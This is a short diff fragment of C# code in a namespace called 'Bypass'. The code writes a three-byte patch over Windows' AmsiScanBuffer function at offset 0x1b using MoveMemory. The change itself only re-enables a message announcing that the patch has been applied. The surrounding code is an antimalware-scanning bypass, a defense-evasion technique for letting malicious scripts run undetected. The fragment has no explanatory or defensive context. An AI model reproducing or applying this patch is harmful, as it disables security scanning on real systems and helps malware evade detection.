@@ -60,7 +60,7 @@ namespace Bypass
             Marshal.Copy(Patch, 0, unmanagedPointer, 3);
             MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
 
-            //Console.WriteLine("AmsiScanBuffer patch has been applied.");
+            Console.WriteLine("AmsiScanBuffer patch has been applied.");
             return 0;
         }
     }
